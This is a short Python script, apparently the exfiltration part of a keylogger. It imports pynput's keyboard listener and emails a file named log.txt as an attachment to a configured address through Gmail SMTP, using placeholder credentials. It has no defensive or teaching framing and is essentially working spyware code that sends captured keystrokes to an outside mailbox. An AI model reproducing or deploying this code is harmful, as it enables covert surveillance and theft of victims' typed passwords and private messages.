from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from smtplib import SMTP
import sys

mensaje = MIMEMultipart("plain")
mensaje["From"] = "correo_origen"
mensaje["To"] = "correo_destino"
mensaje["Subject"] = "Correo de prueba"

adjunto = MIMEBase("application", "octet-stream")
adjunto.set_payload(open("log.txt", "rb").read())
adjunto.add_header("Content-Disposition", "attachment; filename=log.txt")
mensaje.attach(adjunto)

server = SMTP("smtp.gmail.com:587")
server.starttls()
server.login("correo_origen", "contraseña")
server.sendmail( "correo_origen", "correo_destino", mensaje.as_string().encode('utf-8'))

server.quit()